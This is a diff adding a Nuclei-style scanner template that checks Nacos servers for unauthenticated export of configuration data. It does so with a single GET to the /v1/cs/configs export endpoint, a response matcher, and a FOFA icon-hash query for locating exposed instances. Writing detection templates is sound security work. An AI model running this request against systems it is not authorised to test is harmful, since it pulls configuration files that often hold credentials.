@@ -1,0 +1,29 @@
+id: nacos-configs-disclosure
+info:
+  name: nacos 未授权下载配置信息
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="13942501"
+    hunter-query: demo
+  tags: nacos,unauth,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId="
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'nacos','ym')
+        condition: and
+        
+
